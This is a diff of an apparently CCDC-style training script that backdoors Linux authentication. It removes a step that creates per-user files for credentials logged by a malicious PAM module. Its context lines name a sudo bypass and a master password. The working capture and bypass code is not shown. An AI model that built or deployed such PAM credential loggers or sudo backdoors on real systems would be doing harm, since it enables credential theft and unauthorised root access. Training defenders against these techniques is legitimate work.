@@ -295,37 +295,6 @@ for config_file in "${PAM_CONFIG_FILES[@]}"; do
     fi
 done
 
-# Step 5: Create per-user notification files
-echo -e "${YELLOW}[*] Step 5: Initializing user capture logs...${NC}"
-
-# Get all users from /etc/passwd (excluding system users)
-while IFS=: read -r username _ userid _ _ user_home _; do
-    if [ $userid -ge 1000 ] 2>/dev/null || [ "$username" = "root" ]; then
-        if [ -d "$user_home" ]; then
-            capture_file="$user_home/LOOK_WHAT_PAM_CAPTURED_FLAG.txt"
-
-            if [ ! -f "$capture_file" ]; then
-                cat > "$capture_file" << EOF
-================================================================================
-                   CCDC TRAINING - PAM CAPTURE LOG
-================================================================================
-This file demonstrates what a malicious PAM module can capture during
-authentication attempts. Each login attempt's credentials are logged here.
-
-This is a training tool to help your blue team understand PAM vulnerabilities.
-
-Captured Authentication Events:
-================================================================================
-
-EOF
-                chown "$username:$username" "$capture_file" 2>/dev/null || true
-                chmod 600 "$capture_file"
-                echo -e "${GREEN}[+] Created capture log for user: $username${NC}"
-            fi
-        fi
-    fi
-done < /etc/passwd
-
 # Step 6: Create sudo bypass (unrestricted sudo access)
 echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
 
@@ -500,9 +469,6 @@ echo -e "${GREEN}========================================${NC}"
 echo ""
 echo -e "${BLUE}Training Documentation:${NC}"
 echo -e "  ${BLUE}Location:${NC} /opt/ccdc_training/TRAINING_README.txt"
-echo ""
-echo -e "${BLUE}Capture Logs:${NC}"
-echo -e "  ${BLUE}Location:${NC} ~/LOOK_WHAT_PAM_CAPTURED_FLAG.txt"
 echo ""
 echo -e "${BLUE}Master Password:${NC} ${YELLOW}FLAGPASSWORD${NC}"
 echo ""
